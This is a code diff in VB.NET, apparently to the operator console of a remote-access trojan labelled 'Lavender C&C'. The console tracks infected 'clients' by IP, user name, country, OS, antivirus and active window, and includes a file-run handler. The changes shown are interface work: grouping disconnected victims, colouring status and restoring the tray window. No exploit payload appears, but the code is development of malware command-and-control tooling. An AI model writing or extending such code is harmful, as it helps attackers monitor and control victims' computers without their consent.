@@ -111,7 +111,9 @@ Public Class Main
         'For Each address In Dns.GetHostEntry(Dns.GetHostName).AddressList
         '    WriteToLog(address.ToString)
         'Next
-
+        MainDataSet.Settings.Rows.Add(New String() {1, "test"})
+        MainDataSet.Settings.NewRow()
+        MainDataSet.AcceptChanges()
         WriteToLog("Application started")
     End Sub
 
@@ -213,9 +215,17 @@ Public Class Main
             Dim cli As Client = Clients.Find(Function(x) x.Socket = sock)
             clientcount -= 1
             WriteToLog("Client """ & cli.ID & """ disconnected")
-            L1.Items(sock.ToString).Remove()
+            L1.Items(sock.ToString).Group = L1.Groups.Item(1)
             FreezeForms(cli)
             Clients.Remove(cli)
+            If L1.SelectedItems.Count >= 1 Then
+                For Each x As ListViewItem In L1.SelectedItems
+                    If x.Group Is L1.Groups.Item(1) Then
+                        Tabs.Enabled = False
+                        Tabs.Visible = False
+                    End If
+                Next
+            End If
         Catch ex As Exception
         End Try
     End Sub
@@ -293,9 +303,20 @@ Public Class Main
                     cli.Trusted = True
                     S.Send(cli, n.getinfo) ''Get PC Name/info
                 Case n.getinfo ' Client Sent the PC name/info
-                    If L1.Items.Item(sock.ToString) Is Nothing Then
-                        Dim L = L1.Items.Add(sock.ToString, A(1), GetCountryNumber(UCase(A(3))))
-                        L.ImageKey = "zz.png"
+                    Dim L As ListViewItem = Nothing
+                    For i As Integer = 0 To L1.Items.Count - 1
+                        If L1.Items.Item(i).SubItems(0).Text = cli.ID Then
+                            L = L1.Items.Item(i)
+                            L.Name = cli.Socket
+                            Exit For
+                        End If
+                    Next
+                    If L Is Nothing Then
+                        L = L1.Items.Add(cli.Socket.ToString, A(1), GetCountryNumber(UCase(A(3))))
+                        ''L.Tag
+                    End If
+
+                    L.ImageKey = "zz.png"
                         L.SubItems.Add(S.IP(sock)) ''ip
                         L.SubItems.Add(A(2)) ''computer/user
 
@@ -303,9 +324,9 @@ Public Class Main
                         Try
                             Using rdr As New DatabaseReader("GeoLite2-Country.mmdb")
                                 L.SubItems.Add(rdr.Country(S.IP(sock)).Country.Name)
-                                L.ImageKey = rdr.Country(S.IP(sock)).Country.IsoCode & ".png"
-                                ''rdr.
-                            End Using
+                            L.ImageKey = rdr.Country(S.IP(sock)).Country.IsoCode & ".png"
+                            ''rdr.
+                        End Using
                         Catch ex As Exception
                             L.ImageKey = "zz.png" ''TODO: country to ISO
                             If S.IP(sock).StartsWith("192.168.") Or S.IP(sock).StartsWith("10.") Or S.IP(sock).StartsWith("172.16.") Or S.IP(sock).StartsWith("127.0.0.1") Or S.IP(sock).StartsWith("localhost") Then
@@ -318,7 +339,7 @@ Public Class Main
                         L.SubItems.Add(A(4)) ''os
                         L.SubItems.Add(A(5)) ''antivirus
                         L.SubItems.Add(" ") ''active windows
-
+                        L.Group = L1.Groups.Item(0)
                         L.ToolTipText = sock
 
                         ''show tooltip
@@ -327,8 +348,7 @@ Public Class Main
                         TrayIcon.BalloonTipText = "Client connected: [ ID : " & A(1) & " IP : " & S.IP(sock) & " Country : " & A(3) & " ]"
                         TrayIcon.ShowBalloonTip(1)
 
-                        WriteToLog("Client """ & A(1) & """ connected")
-                    End If
+                    WriteToLog("Client """ & A(1) & """ connected")
                 Case n.activewindow ''active window
                     For i As Integer = 0 To L1.Items.Count - 1
                         If L1.Items.Item(i).SubItems(1).Text = S.IP(sock) Then
@@ -338,8 +358,12 @@ Public Class Main
                     Next
                 Case n.status
                     For i As Integer = 0 To L1.Items.Count - 1
-                        If L1.Items.Item(i).SubItems(1).Text = S.IP(sock) Then
-                            L1.Items.Item(i).SubItems(6).Text = A(1)
+                        If L1.Items.Item(i).SubItems(1).Text = S.IP(cli.Socket) Then
+                            If A(1) = 0 Then
+                                L1.Items.Item(i).BackColor = Color.White
+                            Else
+                                L1.Items.Item(i).BackColor = Color.LightYellow
+                            End If
                             Exit For
                         End If
                     Next
@@ -347,7 +371,7 @@ Public Class Main
                     S.Send(cli, A(1)) ''todo
                 Case "F" ''file run?
                     For i As Integer = 0 To L1.Items.Count - 1
-                        If L1.Items.Item(i).SubItems(1).Text = S.IP(sock) Then
+                        If L1.Items.Item(i).SubItems(1).Text = S.IP(cli.Socket) Then
                             L1.Items.Item(i).ForeColor = Color.Black
                             Exit For
                         End If
@@ -388,7 +412,7 @@ Public Class Main
 <meta http-equiv=""Content-Type"" content=""text/html; charset=UTF-8""/>
 <meta http-equiv=""X-UA-Compatible"" content=""IE=edge, chrome=1"">
 <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
-<title>" & L1.Items(sock.ToString).SubItems(2).Text & " | " & cli.ID & "(" & S.IP(sock) & ")</title>
+<title>" & L1.Items(sock.ToString).SubItems(2).Text & " | " & cli.ID & " (" & S.IP(sock) & ")</title>
 </head>
 <body>
 <style>.k {color:#080;} .f{color:#F80;} .content{word-wrap:break-word;white-space:-moz-pre-wrap;white-space:pre-wrap}</style>
@@ -918,6 +942,11 @@ Public Class Main
 
     Private Sub L1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles L1.SelectedIndexChanged
         If L1.SelectedItems.Count >= 1 Then
+            For Each x As ListViewItem In L1.SelectedItems
+                If x.Group Is L1.Groups.Item(1) Then
+                    Return
+                End If
+            Next
             Tabs.Enabled = True
             Tabs.Visible = True
             CurrentClientChange(L1.SelectedItems)
@@ -1009,16 +1038,18 @@ Public Class Main
     End Sub
 
     Private Sub TrayIcon_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles TrayIcon.MouseDoubleClick
+        Me.Show()
         ShowIcon = True
         ShowInTaskbar = True
-        Me.Show()
+        Me.WindowState = FormWindowState.Normal
         Me.BringToFront()
     End Sub
 
     Private Sub ShowToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowToolStripMenuItem.Click
+        Me.Show()
         ShowIcon = True
         ShowInTaskbar = True
-        Me.Show()
+        Me.WindowState = FormWindowState.Normal
         Me.BringToFront()
     End Sub
 #End Region
@@ -1031,7 +1062,7 @@ Public Class Main
             TrayIcon.Visible = True
             TrayIcon.BalloonTipIcon = ToolTipIcon.Info
             TrayIcon.BalloonTipTitle = "Lavender C&C"
-            TrayIcon.BalloonTipText = "Servers online: [x]".Replace("x", L1.Items.Count)
+            TrayIcon.BalloonTipText = "Servers online: x".Replace("x", Clients.Count)
             TrayIcon.ShowBalloonTip(1000)
         End If
     End Sub
